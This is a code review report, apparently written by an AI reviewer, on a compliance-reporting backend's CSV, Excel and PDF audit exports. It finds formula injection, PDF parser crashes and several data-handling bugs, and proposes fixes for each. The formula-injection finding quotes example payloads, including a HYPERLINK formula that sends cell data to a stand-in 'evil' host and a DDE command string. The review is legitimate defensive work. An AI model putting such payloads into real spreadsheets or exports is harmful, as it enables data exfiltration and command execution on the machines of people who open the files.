---
phase: "03"
reviewed: 2026-07-03T16:42:30Z
depth: standard
files_reviewed: 6
files_reviewed_list:
  - backend/compliance_reporting_data.py
  - backend/compliance_reporting_excel.py
  - backend/compliance_reporting_pdf.py
  - backend/compliance_reporting_service.py
  - backend/compliance_reports_endpoints.py
  - backend/tests/test_audit_export.py
findings:
  critical: 2
  warning: 5
  info: 4
  total: 11
status: issues_found
---

# Phase 03: Code Review Report — Audit-Ready Export (Re-Review)

**Reviewed:** 2026-07-03T16:42:30Z
**Depth:** standard
**Files Reviewed:** 6
**Status:** issues_found

## Summary

This is a from-scratch re-review of Phase 03. I first re-verified every claim in
`03-REVIEW-FIX.md` (iteration 1) against current source:

- **CR-01** (missing `generate_all_frameworks_report`) — confirmed fixed, method exists at
  `compliance_reporting_service.py:164-170`.
- **CR-02** (None-tenant bypass) — confirmed fixed, explicit `if not caller_tenant: raise 403`
  guard present at `compliance_reports_endpoints.py:103-104`.
- **CR-03** (report metadata never written) — confirmed fixed, `_store_report_meta` is called
  from every service method.
- **WR-01** (`count` vs `auto_count+manual_count` mismatch) — confirmed fixed, the increment
  now happens outside the `if name:` block.
- **WR-02** (unquoted Content-Disposition) — confirmed fixed, route now relies entirely on
  `FileResponse(..., filename=filename)`.
- **WR-03** (tenant_id never used as a DB filter) — confirmed benign: `get_database()` returns
  a `TenantIsolatedDatabase` (`backend/database.py`) that auto-injects `tenantId` into every
  query on `asset_compliance`, `compliance_artifacts`, and `assets` via a context-var set during
  JWT verification. `compliance_frameworks` is deliberately exempted as global reference data.
- **IN-01** (`STATUS_LEGEND` dead export) — **still open**, not addressed (was out of scope for
  the prior fix pass). See IN-01 below.
- **IN-02** (`test_legacy_download_allows_owner` doesn't exercise the auth path) — **still
  open**, unchanged. See IN-02 below.

Beyond re-verifying the prior findings, this pass found genuinely new issues that the earlier
review missed: an unmitigated CSV/XLSX formula-injection vector across all three export formats
that write user-controlled text, an unhandled `reportlab` parser crash triggerable by ordinary
free-text evidence descriptions, a field-name mismatch that silently defeats the new
`list_compliance_reports` sort/timestamp feature, and a handful of data-shape edge cases in the
evidence merge and asset-summary sort logic.

---

## Critical Issues

### CR-01: CSV/XLSX export writes user-controlled text unsanitized — formula injection (CWE-1236)

**File:** `backend/compliance_reporting_service.py:40-51, 90-102` and
`backend/compliance_reporting_excel.py:111-112, 133-134, 228-229, 247-248`

**Issue:** Evidence names, evidence descriptions, and asset hostnames are all attacker/user
reachable strings (manual evidence upload accepts an arbitrary 1000-char `description`; asset
`hostname` is agent-reported and can be set by a compromised host). These values flow through
`_flatten_evidence` and `_build_report_data` into `asset_summary`/`control_rows` dict values,
which are then written verbatim into CSV rows (`csv.writer.writerow(list(row.values()))`) and
XLSX cells (`ws.append(list(row.values()))`) with no sanitization.

Verified directly: `openpyxl` marks any cell value starting with `=` as a formula
(`cell.data_type == 'f'`). A manual evidence description of `=HYPERLINK("http://evil/"&A1,"x")`
or `=cmd|'/c calc'!A1` (legacy DDE) written into "Evidence Desc" is exported verbatim and will
execute as a live formula when the auditor opens the report in Excel — classic CSV/XLSX formula
injection, capable of data exfiltration or command execution in older Excel versions. This
applies to every export path that writes `asset_summary`/`control_rows` values: `_generate_csv`,
`_generate_all_csv` (compliance_reporting_service.py), `_generate_excel`, `_generate_all_excel`
(compliance_reporting_excel.py). No sanitization of this class exists anywhere in the reviewed
files or the wider `backend/` tree (`grep` for `sanitize.*csv|formula.*inject` returns nothing).

**Fix:** Add a single shared sanitizer and apply it to every cell value before writing, in both
the CSV writer and the XLSX `ws.append()` call sites:
```python
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")

def _sanitize_cell(v):
    s = str(v) if v is not None else v
    if isinstance(s, str) and s and s[0] in _FORMULA_TRIGGERS:
        return "'" + s          # neutralizes formula interpretation, still human-readable
    return v

# CSV:
w.writerow([_sanitize_cell(v) for v in row.values()])

# XLSX:
ws.append([_sanitize_cell(v) for v in row.values()])
```

---

### CR-02: PDF export crashes (500) on ordinary evidence text containing `<tag>`-like sequences

**File:** `backend/compliance_reporting_pdf.py:81-85`

**Issue:** `make_table()` wraps every cell value in `reportlab.platypus.Paragraph(str(v), ...)`.
`Paragraph` parses a mini-XML/HTML-like markup grammar rather than treating input as plain text.
Verified directly with the installed `reportlab` version:
```python
Paragraph("Passed <br> review", styles["Normal"])   # -> ValueError: paraparser: syntax error
Paragraph("Evidence <b description", styles["Normal"])  # -> ValueError: unclosed tags
```
`"Passed <br> review"` is exactly the kind of free text a real auditor would type into the
manual-evidence `description` field (`compliance_evidence_endpoints.py:45`, unsanitized,
max_length=1000) or set as a control/evidence name. Any control whose evidence description,
control name, category, or hostname contains a recognized-tag-like substring (`<br>`, `<i>foo`,
`<b description`, etc.) raises an uncaught `ValueError` inside `_generate_pdf`, which propagates
through `generate_pdf_report` to the endpoint's blanket `except Exception` → HTTP 500. This
breaks PDF export for the *entire framework*, not just the offending row — a single bad
evidence description denies PDF export to every user of that tenant/framework until the data is
manually edited.

**Fix:** Escape free text before constructing `Paragraph` objects (verified this neutralizes the
crash while preserving readability):
```python
import html

hdr_row = [Paragraph(html.escape(str(h), quote=False), hdr_style) for h in headers]
table_data = [hdr_row] + [
    [Paragraph(html.escape(str(v), quote=False), cell_style) for v in row]
    for row in rows_plain
]
```

---

## Warnings

### WR-01: `list_compliance_reports` reads a field name that `_store_report_meta` never writes

**File:** `backend/compliance_reports_endpoints.py:146` vs. `backend/compliance_reporting_service.py:120-127`

**Issue:** `_store_report_meta` persists the timestamp as `"createdAt"`:
```python
await db.compliance_reports.update_one(
    {"filename": filename},
    {"$set": {"filename": filename, "tenantId": tenant_id,
              "createdAt": datetime.now().isoformat()}},
    upsert=True,
)
```
`list_compliance_reports` reads `doc.get("created") or doc.get("generatedAt") or ""` — neither
key exists on the stored document. As a result, the persisted timestamp is never used; the
endpoint always falls through to the filesystem `os.path.getctime()` fallback (itself dependent
on `_REPORTS_DIR` resolving correctly — see WR-04 below), and `reports.sort(key=lambda x:
x.get("created") or "", reverse=True)` degrades to an unstable/undefined ordering whenever that
fallback also fails to resolve a file.

**Fix:**
```python
created = doc.get("createdAt") or doc.get("created") or doc.get("generatedAt") or ""
```

---

### WR-02: Excel sheet-name truncation still exceeds the 31-character OOXML limit

**File:** `backend/compliance_reporting_excel.py:218-220, 237`

**Issue:**
```python
short = re.sub(r'[\\/?*\[\]:]', '-', fw_name)[:24].strip()
ws_a = wb.create_sheet(f"{short} Assets")     # up to 24 + 7  = 31 chars — OK
ws_c = wb.create_sheet(f"{short} Controls")   # up to 24 + 9  = 33 chars — exceeds limit
```
Excel/OOXML sheet titles are capped at 31 characters. `openpyxl` only warns (doesn't raise), but
titles beyond 31 chars are out-of-spec and can be rejected or silently mangled by stricter
readers (Google Sheets, LibreOffice in strict mode, some BI ingestion tools). This is not
theoretical: current seed data includes `"NIST Cybersecurity Framework v2.0"`
(`seed_compliance_frameworks_a.py:86`), which truncates to `"NIST Cybersecurity Frame"` (24
chars) + `" Controls"` (9 chars) = 33-char sheet title.

**Fix:** Truncate to `31 - len(" Controls")` (the longer of the two suffixes):
```python
short = re.sub(r'[\\/?*\[\]:]', '-', fw_name)[:22].strip()
```

---

### WR-03: Evidence merge treats two id-less evidence records as duplicates (`None == None`)

**File:** `backend/compliance_reporting_data.py:184-189`

**Issue:**
```python
for aid, doc in matching:
    asset_ev = doc.get("evidence", [])
    merged   = asset_ev + [
        a for a in standalone
        if not any(ae.get("id") == a.get("id") for ae in asset_ev)
    ]
```
If any entry in `asset_ev` lacks an `"id"` key, `ae.get("id")` is `None`. Any standalone artifact
`a` that also lacks `"id"` (`a.get("id")` is `None`) will match via `None == None`, and `any(...)`
returns `True` for it even though the two records are unrelated — the standalone artifact is
silently dropped from the exported evidence list. Current evidence-creation code paths
(`compliance_evidence_endpoints.py`, `compliance_artifacts_endpoints.py`) do always assign a
UUID-based `id`, so this is not observed with data created through those endpoints today, but
the dedup logic itself has no defense against absent `id` (legacy records, bulk imports, or any
future evidence source that omits it) and will silently under-report evidence for an audit —
exactly the kind of correctness gap that matters most for an "audit-ready export" feature.

**Fix:** Fall back to a stable synthetic key rather than comparing `None`:
```python
def _ev_key(e):
    return e.get("id") or e.get("url") or e.get("name") or id(e)

seen_asset_ids = {_ev_key(ae) for ae in asset_ev}
merged = asset_ev + [a for a in standalone if _ev_key(a) not in seen_asset_ids]
```

---

### WR-04: `_REPORTS_DIR` is cwd-relative, inconsistent with every sibling module

**File:** `backend/compliance_reports_endpoints.py:15`

**Issue:**
```python
_REPORTS_DIR = "static/reports"
```
Every other module that reads/writes this directory anchors it to the source file's own
location: `app.py:79` (`os.path.join(os.path.dirname(__file__), "static", "reports")`),
`compliance_report_endpoints.py:20` (same pattern), and
`compliance_reporting_service.py:134-136` (`ComplianceReportingService.reports_dir`, same
pattern — this is the directory reports are actually written to). `compliance_reports_endpoints.py`
is the only module in this group using a bare relative path. In the two known launch paths
(`start-all-services.sh` does `cd backend` first; `backend/Dockerfile` sets `WORKDIR /app` with
backend files copied to `/app`) the cwd happens to coincide with the backend directory, so this
does not currently manifest — but it is a latent portability bug: any alternate launcher, process
supervisor, or `python -m` invocation with a different cwd will make `download_compliance_report`
and `list_compliance_reports`' filesystem fallback silently 404 on files that
`ComplianceReportingService` did in fact write.

**Fix:**
```python
_REPORTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "reports")
```

---

### WR-05: `sorted(asset_counts.items())` can raise `TypeError` if any `assetId` is present-but-`None`

**File:** `backend/compliance_reporting_data.py:130-139`

**Issue:**
```python
asset_counts: dict = {}
for doc in ac_docs:
    aid  = doc.get("assetId", "unknown")   # default only applies if key is ABSENT
    ...
    asset_counts[aid][norm] += 1
...
for aid, counts in sorted(asset_counts.items()):   # line 139
```
`.get("assetId", "unknown")` only substitutes `"unknown"` when the key is missing — if the key
is present with value `None` (or `""`), `aid` becomes `None`/`""` verbatim. Mixing a `None` key
with string keys in the same dict and calling `sorted()` on `.items()` raises
`TypeError: '<' not supported between instances of 'NoneType' and 'str'` in Python 3 (verified).
Note the code eleven lines later (`asset_ids = list({d.get("assetId") for d in ac_docs if
d.get("assetId")})`) explicitly filters out falsy `assetId` values, showing the author was aware
this field can be missing/falsy — the same guard was not applied to the `asset_counts` loop.

**Fix:**
```python
aid = doc.get("assetId") or "unknown"
```

---

## Info

### IN-01: `STATUS_LEGEND` is still a dead export (carried forward, unresolved)

**File:** `backend/compliance_reporting_data.py:9-18`

**Issue:** Still true as of this pass — `grep -rn "STATUS_LEGEND" backend/` returns only the
definition site. No renderer imports it; PDF and Excel each maintain their own independent
status-color maps. This was flagged in the original 2026-06-18 review (IN-01) and was explicitly
out of scope for the prior fix pass; it remains unaddressed.

**Fix:** Remove it, or wire it into the renderers if a shared vocabulary mapping is actually
intended for future use.

---

### IN-02: `test_legacy_download_allows_owner` still doesn't exercise the ownership-check path (carried forward, unresolved)

**File:** `backend/tests/test_audit_export.py:108-130`

**Issue:** Unchanged from the original 2026-06-18 review. The test patches `os.path.exists` to
return `False`:
```python
with patch.object(compliance_reports_endpoints, "get_database", return_value=mock_db, create=True), \
     patch("os.path.exists", return_value=False):
    ...
    response = client.get("/api/compliance/reports/download/compliance_report_x_1.pdf")
assert response.status_code != 403, (...)
```
In the route, `os.path.exists(file_path)` is checked (line 96) and raises HTTP 404 *before* the
tenant-ownership check (line 103) is ever reached. The assertion passes trivially because 404 ≠
403, but the "does the same-tenant owner actually get through the DB ownership check" path is
never exercised — false coverage confidence for the one test whose entire purpose is verifying
that.

**Fix:**
```python
with patch.object(compliance_reports_endpoints, "get_database", return_value=mock_db, create=True), \
     patch("os.path.exists", return_value=True):
    client = TestClient(app, raise_server_exceptions=False)
    response = client.get("/api/compliance/reports/download/compliance_report_x_1.pdf")
assert response.status_code == 200, f"Owner should receive 200, got {response.status_code}"
```

---

### IN-03: Broad `except Exception: ... continue` silently skips frameworks in combined reports

**File:** `backend/compliance_reporting_excel.py:194-198` and `backend/compliance_reporting_service.py:81-85`

**Issue:** Both `_generate_all_excel` and `_generate_all_csv` wrap each per-framework
`_build_report_data` call in `except Exception as exc: logger.warning(...); continue`. This is
broader than the one documented failure mode (a framework whose `control_ids` no longer resolve
would raise `ValueError` from `_build_report_data`); it also silently swallows genuine bugs
(`KeyError`, `AttributeError`, DB timeouts) with no signal returned to the caller beyond a
server-side log line and a smaller `frameworkCount` in the response. A caller has no way to know
their "all frameworks" export is silently missing a framework due to an actual defect versus
having none.

**Fix:** Narrow the catch to `ValueError` (the documented "not found" case) and let unexpected
exceptions propagate, or surface skipped-framework names/reasons in the response payload.

---

### IN-04: Download route reveals filename existence before checking tenant ownership

**File:** `backend/compliance_reports_endpoints.py:92-108`

**Issue:** The existence check (`os.path.exists` → 404) happens before the tenant-ownership
check (→ 403). A caller probing filenames belonging to another tenant can distinguish
"exists (403)" from "doesn't exist (404)" without ever being authorized to view the report,
leaking existence of report filenames across tenants. Low impact since filenames aren't
sensitive secrets on their own (`compliance_report_{framework_id}_{timestamp}.{ext}`), but it's
an easy no-cost fix.

**Fix:** Perform the tenant-ownership DB lookup before the filesystem existence check, or return
404 (not 403) for cross-tenant access to avoid the existence oracle entirely.

---

_Reviewed: 2026-07-03T16:42:30Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
